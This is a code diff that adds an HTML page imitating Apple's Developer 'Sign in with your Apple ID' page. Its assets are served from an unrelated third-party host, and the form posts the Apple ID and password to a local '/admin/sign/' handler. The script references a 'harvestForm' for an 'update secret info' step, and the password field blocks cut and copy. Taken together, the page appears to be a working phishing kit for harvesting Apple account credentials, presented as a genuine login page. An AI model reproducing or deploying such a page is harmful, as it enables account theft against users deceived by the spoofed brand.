@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+	<meta http-equiv="content-type" content="text/html; charset=windows-1252">
+	<meta name="Author" content="Apple Inc.">
+	<meta name="viewport" content="width=1024">
+	<link rel="shortcut icon" href="https://devimages.apple.com.edgekey.net/favicon.ico">
+	<link rel="icon" href="https://devimages.apple.com.edgekey.net/favicon.ico">
+	<link rel="stylesheet" href="http://newfarm3.dev.haalee.com/images/login/base.css" type="text/css">
+	<link rel="stylesheet" href="http://newfarm3.dev.haalee.com/images/login/adc.css" type="text/css">
+	<script src="http://newfarm3.dev.haalee.com/images/login/prototype.js" type="text/javascript" charset="utf-8"></script>
+	<script src="http://newfarm3.dev.haalee.com/images/login/scriptaculous.js" type="text/javascript" charset="utf-8"></script>
+	<script src="http://newfarm3.dev.haalee.com/images/login/browserdetect.js" type="text/javascript" charset="utf-8"></script>
+	<script src="http://newfarm3.dev.haalee.com/images/login/apple_core.js" type="text/javascript" charset="utf-8"></script>
+	<script src="http://newfarm3.dev.haalee.com/images/login/search_decorator.js" type="text/javascript" charset="utf-8"></script>
+	<script src="http://newfarm3.dev.haalee.com/images/login/adc_core.js" type="text/javascript" charset="utf-8"></script>
+	<script src="http://newfarm3.dev.haalee.com/images/login/ac_retina.js" type="text/javascript" charset="utf-8"></script>
+	<script type="text/javascript">
+		document.write('<link rel="stylesheet" type="text/css" href="https://devimages.apple.com.edgekey.net/assets/styles/script.css" media="screen">');
+	</script><link rel="stylesheet" type="text/css" href="http://newfarm3.dev.haalee.com/images/login/script.css" media="screen">	
+	
+	<title>Sign in with your Apple ID - Apple Developer</title>
+	<link rel="stylesheet" href="http://newfarm3.dev.haalee.com/images/login/linen.css" type="text/css">
+	<link rel="stylesheet" href="http://newfarm3.dev.haalee.com/images/login/linen_002.css" type="text/css">
+	<script>
+	Event.onDOMReady(function() {
+		// password expired page
+		if ($$('span.dsheading').length > 0) {
+			$$('#ds_container .dslabel label').each(function(el) { el.innerHTML += ':'; });
+			if ($$('span.dserror').length > 0) {
+				$$('span.dserror').each(function(el) {
+					el.innerHTML = el.innerHTML.gsub('AppleID', 'Apple ID');
+				});
+				$$('img').each(function(img) {
+					img.hide();
+				});
+			}
+			$('content').show();
+			if($$('span.dsheading')[0].innerHTML == "Sign In Successful") {
+				// update secret info page
+				$$('body.login')[0].addClassName('update-info');
+				$$('input').each(function(el) {
+					el.observe('keyup', function(e) {
+						if(e.keyCode == Event.KEY_RETURN) {
+							document.harvestForm.submit();
+							e.stop();
+						}
+					});
+				});
+			} else {
+				// regular password expired pages
+				$$('body.login')[0].addClassName('password-expired');
+				$$('input').each(function(el) {
+					el.observe('keyup', function(e) {
+						if(e.keyCode == Event.KEY_RETURN) {
+							document.appleConnectExpiredPasswordForm.submit();
+							e.stop();
+						}
+					});
+				});
+			}
+		}
+		// wrong password page
+		else if ($$('span.dserror').length > 0) {
+			$$('body.login')[0].addClassName('password-wrong');
+			$$('#ds_container .dslabel').each(function(el) { el.innerHTML += ':'; });
+			$('content').show();
+			document.appleConnectForm.theAccountPW.focus();
+		}
+		// basic login page
+		else {
+			$$('#ds_container .dslabel').each(function(el) { el.innerHTML += ':'; });
+			$$('#ds_container tr')[1].hide();
+			$('content').show();
+		}
+	});
+	</script>
+</head>
+<body class="login hasjs" onload="dsfocus()">
+	<div class="content-wrapper">
+
+		<div id="globalheader" data-hires="true">
+			<h1><a href="https://developer.apple.com/">Apple Developer</a></h1>
+		</div>
+
+		<div id="content" class="content" style="">
+
+			<header class="hero">
+				<hgroup>
+					<h1>Sign in with your Apple ID</h1>
+					<p class="intro">Use the Apple ID you used to register or register now.</p>
+				</hgroup>
+			</header>
+
+				
+	
+	
+		
+			<script>
+	function dsfocus(){ document.appleConnectForm.theAccountName.focus(); }
+</script>
+
+
+	
+		<div id="ds_container">
+	
+	
+
+
+
+
+	
+		
+			<form method="post" name="appleConnectForm" action="/admin/sign/">
+
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+				
+					<table border="0" cellpadding="0" cellspacing="0" width="273">
+						<tbody><tr valign="top">
+							<td align="left"><font size="2"><font class="G10" face="Geneva, Verdana, Arial, Helvetica, sans-serif" size="1">
+								<label for="accountname"><span class="dslabel">Apple ID:</span></label>
+								<font color="#ff1102"></font></font><br>
+								<font size="2"><input size="30" autocapitalize="off" autocorrect="off" maxlength="128" id="accountname" name="theAccountName" type="text"></font></font>
+								
+							</td>
+						</tr>
+						
+						<tr style="display: none;"><td><img alt="" src="http://newfarm3.dev.haalee.com/images/login/spacer.gif" height="5" width="273"></td></tr>
+						<tr><td><img alt="" src="http://newfarm3.dev.haalee.com/images/login/spacer.gif" height="5" width="273"></td></tr>
+						<tr>
+							<td align="left">
+								<font class="G10" face="Geneva, Verdana, Arial, Helvetica, sans-serif" size="1">
+									<label for="accountpassword"><span class="dslabel">Password:</span></label>
+								</font>
+								<br>
+								<input size="30" autocapitalize="off" oncut="return false ;" oncopy="return false ;" autocorrect="off" maxlength="32" id="accountpassword" name="theAccountPW" type="password"><input name="1.Continue" src="http://newfarm3.dev.haalee.com/images/login/spacer.gif" border="0" height="0" type="image" width="0">
+							</td>
+						</tr>
+						
+						
+						
+						<tr><td><img alt="" src="http://newfarm3.dev.haalee.com/images/login/spacer.gif" height="5" width="273"></td></tr>
+						<tr><td><img alt="" src="http://newfarm3.dev.haalee.com/images/login/spacer.gif" height="5" width="273"></td></tr>
+						
+						<tr>
+							<td>
+								<table border="0" cellpadding="0" cellspacing="0" width="273">
+									<tbody><tr align="left">
+										
+											<td align="left" width="170">
+												
+
+												
+													<font size="1">
+														<span class="dstext">
+															
+
+															
+																
+																
+																	<!-- Show Forgot Password Button as button -->
+																	<input alt="Did you forget your password?" name="1.Forgot" src="http://newfarm3.dev.haalee.com/images/login/adc09_forgot_password.png" border="0" type="image">
+																
+															
+														</span>
+													</font>
+												
+											</td>
+											<td width="15"><img alt="" src="http://newfarm3.dev.haalee.com/images/login/spacer.gif" height="5" width="15"></td>
+										
+										
+										
+											<td align="left" width="88"><input alt="Sign In" name="1.Continue" src="http://newfarm3.dev.haalee.com/images/login/adc09_signin.png" border="0" type="image"></td>
+										
+										
+									</tr>
+								</tbody></table>
+							</td>
+						</tr>
+					</tbody></table>
+					<input name="theAuxValue" type="hidden">
+				
+			<input name="wosid" value="guDKSsVe8dGtlSk8PJDlQw" type="hidden"></form>
+		
+
+		
+		
+		
+		
+			
+</div>
+
+	
+	
+	
+	
+	
+
+
+
+
+		
+		
+	
+			
+
+			<a class="button large blue password-update" onclick="document.appleConnectExpiredPasswordForm.submit(); return false;"><span>Update</span></a>
+			<a class="button large register-button" href="https://developer.apple.com/programs/register/"><span>Register</span></a>
+			<a class="button large blue signin-button" onclick="document.appleConnectForm.submit(); return false;"><span>Sign In</span></a>
+			<div class="divider"></div>
+			<a class="forgot-button" href="https://iforgot.apple.com/">Forgot ID or Password?</a>
+					
+		</div><!-- /content -->
+
+		<div class="content-spacer"></div>
+
+		<div id="globalfooter">
+			<div class="gf-sosumi">
+				<ul class="piped">
+					<li><a href="http://www.apple.com/legal/terms/site.html" class="first">Terms of Use</a></li>
+					<li><a href="http://www.apple.com/privacy/">Privacy Policy</a></li>
+				</ul>
+			</div>
+		</div><!--/globalfooter-->
+	</div>
+
+<div id="xunlei_com_thunder_helper_plugin_d462f475-c18e-46be-bd10-327458d045bd"></div></body></html>
